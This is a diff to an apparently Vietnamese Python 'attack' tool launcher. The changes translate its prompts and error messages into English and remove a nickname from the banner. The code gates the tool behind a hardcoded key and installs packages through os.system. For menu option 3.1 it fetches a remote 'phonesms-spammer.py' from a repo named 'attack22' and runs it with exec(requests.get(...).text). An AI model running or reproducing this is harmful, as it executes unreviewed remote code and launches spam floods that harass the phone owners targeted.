@@ -11,7 +11,7 @@ try:
     import pystyle
 except:
     os.system("pip install faker requests colorama pystyle bs4")
-    print('__Vui Lòng Chạy Lại Tool__')
+    print('__please run the tool again.__')
     exit()
 
 from pystyle import Center, Colors, Colorate
@@ -20,13 +20,13 @@ from pystyle import Center, Colors, Colorate
 correct_key = "vandung_1005"
 
 # Yêu cầu nhập key để chạy tool
-user_key = input("\033[1;97mNhập Key để tiếp tục: ")
+user_key = input("\033[1;97m enter password: ")
 
 if user_key != correct_key:
-    print("\033[1;91m[X] Key không hợp lệ! Tool thoát.\n")
+    print("\033[1;91m[X] not working! leave tool.\n")
     exit()
 else:
-    print("\033[1;92m[Ok] Key hợp lệ! Đang khởi động tool...\n")
+    print("\033[1;92m[Ok] working! start tool...\n")
 
 def banner():
     banner = f"""
@@ -39,7 +39,7 @@ def banner():
 ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝   ╚═╝\n
 \033[1;97mSource Public: \033[1;32mDonny            \033[1;97mPhiên Bản: \033[1;32m4.0     
 \033[97m════════════════════════════════════════════════  
-\033[1;97m[\033[1;91m❣\033[1;97m] Facebook\033[1;31m  : \033[1;97m \033[1;36mNguyễn Văn Dững(Donny)\033[1;31m \033[1;97m
+\033[1;97m[\033[1;91m❣\033[1;97m] Facebook\033[1;31m  : \033[1;97m \033[1;36mNguyễn Văn Dững\033[1;31m \033[1;97m
 \033[1;97m[\033[1;91m❣\033[1;97m] Telegram\033[1;31m : \033[1;97m \033[1;32mhttps://t.me/xyzvandung\033[1;97m
 \033[97m════════════════════════════════════════════════
 """
@@ -82,7 +82,7 @@ while True:
     elif chon == '3.1':
         exec(requests.get('https://raw.githubusercontent.com/vandung2009/attack22/refs/heads/main/phonesms-spammer.py').text)
     elif chon == '3.2':
-        print("\033[1;91mThoát tool...")
+        print("\033[1;91mLeave...")
         exit()
     else:
-        print("\033[1;91m[X] Lựa chọn không hợp lệ! Hãy thử lại.\n")
+        print("\033[1;91m[X] invalid.\n")
